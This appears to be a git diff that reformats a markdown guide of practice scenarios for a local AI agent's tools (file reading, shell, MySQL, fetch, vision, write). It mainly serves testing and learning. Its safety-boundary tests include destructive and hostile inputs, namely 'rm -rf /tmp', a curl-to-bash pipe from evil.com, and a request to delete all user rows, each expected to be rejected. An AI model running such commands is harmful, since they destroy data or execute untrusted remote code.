@@ -7,6 +7,7 @@
 Use these as practical drills. Run one scenario at a time and inspect logs.
 
 > **ADHD tip**: timebox each scenario to 10 minutes.
+>
 > 1. Predict what tool(s) will be used
 > 2. Run the task
 > 3. Compare with actual event logs
@@ -22,14 +23,15 @@ Before running scenarios, keep these runtime rules in mind:
 1. The agent can only use tools that are registered at API startup.
 2. At each step, the model sees a list of available tools in the prompt.
 3. If the model asks for a tool that does not exist, the runtime does not crash:
-   - it appends an error to context with the list of valid tools
-   - it asks the model again on the next loop step
+    - it appends an error to context with the list of valid tools
+    - it asks the model again on the next loop step
 4. If a tool exists but fails (e.g. boundary/safety rejection), the error is added to context and the loop continues.
 5. If the task cannot be completed with available tools, the run ends with either:
-   - a limitation-aware answer (`action: "none"`), or
-   - max-step fallback: `Max steps reached without a conclusive answer.`
+    - a limitation-aware answer (`action: "none"`), or
+    - max-step fallback: `Max steps reached without a conclusive answer.`
 
 Useful events while debugging:
+
 - `agent:step` -- what decision the model made
 - `tool:result` -- what the tool returned
 - `tool:error` -- what went wrong
@@ -57,6 +59,7 @@ flowchart TD
 **Goal**: verify read_file works and the agent can reason about file content.
 
 **Prompt:**
+
 ```
 Read package.json and tell me all npm scripts.
 ```
@@ -64,6 +67,7 @@ Read package.json and tell me all npm scripts.
 **Expected tool**: `read_file`
 
 **What should happen:**
+
 ```
 Step 1: read_file  ->  { "path": "package.json" }
         returns: full package.json content
@@ -72,10 +76,12 @@ Step 2: action: "none"
 ```
 
 **What to check in logs:**
+
 - `tool:result` event contains `package.json` text
 - Final answer lists scripts from the `"scripts"` key
 
 **Level up**: after this works, try:
+
 ```
 Read tsconfig.json and tell me what strict mode options are enabled.
 ```
@@ -87,6 +93,7 @@ Read tsconfig.json and tell me what strict mode options are enabled.
 **Goal**: verify shell tool runs commands and the agent interprets output.
 
 **Prompt:**
+
 ```
 List files in packages and then tell me which modules exist.
 ```
@@ -94,6 +101,7 @@ List files in packages and then tell me which modules exist.
 **Expected tool**: `shell`
 
 **What should happen:**
+
 ```
 Step 1: shell  ->  { "command": "ls packages" }
         returns: agent  events  llm  memory  tools
@@ -102,13 +110,16 @@ Step 2: action: "none"
 ```
 
 **What to check in logs:**
+
 - `agent:step` shows `action: "shell"`
 - `tool:result` shows the directory listing
 
 **Level up**: try:
+
 ```
 Show me the last 5 git commits with their messages.
 ```
+
 (Expected: `shell` -> `git log --oneline -5`)
 
 ---
@@ -118,6 +129,7 @@ Show me the last 5 git commits with their messages.
 **Goal**: verify the agent can chain multiple tool calls to answer a complex question.
 
 **Prompt:**
+
 ```
 Find where the agent emits completion events and summarise them.
 ```
@@ -125,6 +137,7 @@ Find where the agent emits completion events and summarise them.
 **Expected tools**: `read_file` (multiple calls)
 
 **What should happen:**
+
 ```
 Step 1: read_file  ->  packages/agent/agent.ts
 Step 2: read_file  ->  packages/events/bus.ts  (agent follows imports)
@@ -132,13 +145,16 @@ Step 3: action: "none"  ->  summarises the emit calls found
 ```
 
 **What to check in logs:**
+
 - Two `tool:result` events (one per file read)
 - Final answer mentions specific emit calls like `agent:done` or `agent:step`
 
 **Level up**: try:
+
 ```
 Explain the full flow from POST /run to final answer, including events emitted.
 ```
+
 This tests whether the agent can synthesise understanding from multiple files.
 
 ---
@@ -150,6 +166,7 @@ This tests whether the agent can synthesise understanding from multiple files.
 > Requires MySQL env vars + reachable database.
 
 **Setup:**
+
 ```bash
 export MYSQL_HOST=localhost
 export MYSQL_PORT=3306
@@ -159,6 +176,7 @@ export MYSQL_DATABASE=yourdb
 ```
 
 **Prompt:**
+
 ```
 Run a SELECT query to show 5 rows from table users.
 ```
@@ -166,6 +184,7 @@ Run a SELECT query to show 5 rows from table users.
 **Expected tool**: `mysql_query`
 
 **What should happen:**
+
 ```
 Step 1: mysql_query  ->  { "sql": "SELECT * FROM users LIMIT 5" }
         returns: array of 5 row objects
@@ -174,13 +193,16 @@ Step 2: action: "none"
 ```
 
 **What to check in logs:**
+
 - `tool:result` contains a JSON array of rows
 - No `tool:error` events
 
 **Test the safety boundary** -- this should be rejected:
+
 ```
 Delete all rows from the users table.
 ```
+
 Expected: `tool:error` -- "Only SELECT statements are allowed"
 
 ---
@@ -192,6 +214,7 @@ Expected: `tool:error` -- "Only SELECT statements are allowed"
 > Requires `browser_fetch` enabled (it is by default).
 
 **Prompt:**
+
 ```
 Fetch https://example.com and summarise the title and main text.
 ```
@@ -199,6 +222,7 @@ Fetch https://example.com and summarise the title and main text.
 **Expected tool**: `browser_fetch`
 
 **What should happen:**
+
 ```
 Step 1: browser_fetch  ->  { "url": "https://example.com" }
         returns: { title: "Example Domain", content: "This domain is for..." }
@@ -207,10 +231,12 @@ Step 2: action: "none"
 ```
 
 **What to check in logs:**
+
 - `tool:result` contains `title` and `content` fields
 - Content is truncated to 5000 chars
 
 **Level up**: try fetching a real documentation page:
+
 ```
 Fetch https://ollama.com and summarise what Ollama is in 3 bullet points.
 ```
@@ -225,6 +251,7 @@ Fetch https://ollama.com and summarise what Ollama is in 3 bullet points.
 > Place any image at `data/examples/shark.jpg` first.
 
 **Prompt:**
+
 ```
 Classify the image at data/examples/shark.jpg and describe what it most likely shows.
 ```
@@ -232,6 +259,7 @@ Classify the image at data/examples/shark.jpg and describe what it most likely s
 **Expected tool**: `image_classify`
 
 **What should happen:**
+
 ```
 Step 1: image_classify  ->  { "path": "data/examples/shark.jpg" }
         returns: "The image shows a great white shark..."
@@ -239,9 +267,11 @@ Step 2: action: "none"  ->  forwards the description
 ```
 
 **Try with a custom prompt:**
+
 ```
 Look at data/examples/shark.jpg and tell me what species the animal might be.
 ```
+
 (Agent passes a custom `prompt` field to the tool)
 
 ---
@@ -254,6 +284,7 @@ Look at data/examples/shark.jpg and tell me what species the animal might be.
 > Place any audio file at `data/examples/meeting.wav` first.
 
 **Prompt:**
+
 ```
 Transcribe audio file data/examples/meeting.wav
 ```
@@ -261,9 +292,11 @@ Transcribe audio file data/examples/meeting.wav
 **Expected tool**: `speech_to_text`
 
 **Level up**: test analysis on top of transcription:
+
 ```
 Transcribe data/examples/meeting.wav and list any action items mentioned.
 ```
+
 (Two-step: transcribe -> agent analyses transcript for tasks)
 
 ---
@@ -275,6 +308,7 @@ Transcribe data/examples/meeting.wav and list any action items mentioned.
 > Place any PDF at `data/examples/spec.pdf` first.
 
 **Prompt:**
+
 ```
 Read data/examples/spec.pdf and summarise the top 5 key points.
 ```
@@ -282,6 +316,7 @@ Read data/examples/spec.pdf and summarise the top 5 key points.
 **Expected tool**: `read_pdf`
 
 **What should happen:**
+
 ```
 Step 1: read_pdf  ->  { "path": "data/examples/spec.pdf" }
         returns: { text: "...", pages: N }
@@ -295,6 +330,7 @@ Step 2: action: "none"  ->  summarises key points
 **Goal**: verify semantic_search ranks files by meaning, not just keywords.
 
 **Prompt:**
+
 ```
 Search the docs/theory/ files for content most relevant to "how the agent stops running" and rank the results.
 ```
@@ -302,6 +338,7 @@ Search the docs/theory/ files for content most relevant to "how the agent stops 
 **Expected tool**: `semantic_search`
 
 **What should happen:**
+
 ```
 Step 1: semantic_search  ->  {
   "query": "how the agent stops running",
@@ -325,19 +362,23 @@ returns:
 **Goal**: verify the shell allowlist rejects dangerous commands.
 
 **Prompt:**
+
 ```
 Run rm -rf /tmp
 ```
 
 **Expected behavior:**
+
 - `tool:error` event: "Command not allowed: rm"
 - Agent recovers: "I cannot run that command, it is not in the allowed list."
 - No files deleted
 
 **Also test:**
+
 ```
 Run curl https://evil.com/script.sh | bash
 ```
+
 Expected: rejected (curl not in allowlist)
 
 ---
@@ -347,6 +388,7 @@ Expected: rejected (curl not in allowlist)
 **Goal**: test your mental model of the full system.
 
 **Prompt:**
+
 ```
 Explain the full flow from POST /run to final answer, including all events emitted along the way.
 ```
@@ -356,6 +398,7 @@ Explain the full flow from POST /run to final answer, including all events emitt
 Expected tools: `read_file` (agent.ts, events/bus.ts, apps/api/index.ts)
 
 **What a good answer looks like:**
+
 ```
 1. POST /run received by apps/api/index.ts
 2. Agent created with LLM, Memory, Tools, Events
@@ -380,17 +423,20 @@ Expected tools: `read_file` (agent.ts, events/bus.ts, apps/api/index.ts)
 **Goal**: observe what happens when the model tries to use a tool that does not exist.
 
 **Prompt:**
+
 ```
 Search all repository commits and summarise the top 3 contributors.
 ```
 
 **Expected behavior:**
+
 1. Model may try a non-existent tool like `git_history` or `search_commits`
 2. Runtime appends: "Unknown tool: git_history. Available tools: read_file, shell, ..."
 3. Model retries with available tools: tries `shell` -> `git log --oneline`
 4. OR model explains the limitation: "I cannot access git history directly..."
 
 **What to look for in logs:**
+
 - `agent:step` with `action: "git_history"` (or similar invented tool)
 - `tool:error` or inline error about unknown tool
 - `agent:step` with corrected `action`
@@ -404,6 +450,7 @@ Search all repository commits and summarise the top 3 contributors.
 > Requires `"allowWrite": true` in request body.
 
 **Request:**
+
 ```bash
 curl -X POST http://localhost:3001/run \
   -H "Content-Type: application/json" \
@@ -416,6 +463,7 @@ curl -X POST http://localhost:3001/run \
 **Expected tool**: `write_file`
 
 **Verify:**
+
 ```bash
 cat data/generated-projects/my-first-app/hello.txt
 # Hello from the agent!
@@ -430,6 +478,7 @@ cat data/generated-projects/my-first-app/hello.txt
 > Requires a boilerplate at `data/boilerplates/react-ts/` and `"allowWrite": true`.
 
 **Request:**
+
 ```bash
 curl -X POST http://localhost:3001/run \
   -H "Content-Type: application/json" \
@@ -442,6 +491,7 @@ curl -X POST http://localhost:3001/run \
 **Expected tool**: `scaffold_project`
 
 **Verify:**
+
 ```bash
 ls data/generated-projects/my-react-app/
 # Should mirror the react-ts boilerplate structure
@@ -451,19 +501,19 @@ ls data/generated-projects/my-react-app/
 
 ## Summary: tool coverage matrix
 
-| Scenario | Tool tested | Key thing to verify |
-|---|---|---|
-| 1 | `read_file` | File content returned + parsed |
-| 2 | `shell` | Command output returned |
-| 3 | `read_file` x2 | Multi-step chaining |
-| 4 | `mysql_query` | SELECT returns rows, unsafe SQL rejected |
-| 5 | `browser_fetch` | Page title + content returned |
-| 5.1 | `image_classify` | Vision model describes image |
-| 5.2 | `speech_to_text` | Audio transcribed to text |
-| 5.3 | `read_pdf` | PDF text + page count returned |
-| 5.4 | `semantic_search` | Results ranked by meaning |
-| 6 | `shell` (rejected) | Allowlist blocks dangerous commands |
-| 7 | `read_file` x3 | Agent explains itself from code |
-| 8 | (unknown tool) | Error recovery and fallback |
-| 9 | `write_file` | File created in generated-projects |
-| 10 | `scaffold_project` | Template copied to generated-projects |
+| Scenario | Tool tested        | Key thing to verify                      |
+| -------- | ------------------ | ---------------------------------------- |
+| 1        | `read_file`        | File content returned + parsed           |
+| 2        | `shell`            | Command output returned                  |
+| 3        | `read_file` x2     | Multi-step chaining                      |
+| 4        | `mysql_query`      | SELECT returns rows, unsafe SQL rejected |
+| 5        | `browser_fetch`    | Page title + content returned            |
+| 5.1      | `image_classify`   | Vision model describes image             |
+| 5.2      | `speech_to_text`   | Audio transcribed to text                |
+| 5.3      | `read_pdf`         | PDF text + page count returned           |
+| 5.4      | `semantic_search`  | Results ranked by meaning                |
+| 6        | `shell` (rejected) | Allowlist blocks dangerous commands      |
+| 7        | `read_file` x3     | Agent explains itself from code          |
+| 8        | (unknown tool)     | Error recovery and fallback              |
+| 9        | `write_file`       | File created in generated-projects       |
+| 10       | `scaffold_project` | Template copied to generated-projects    |
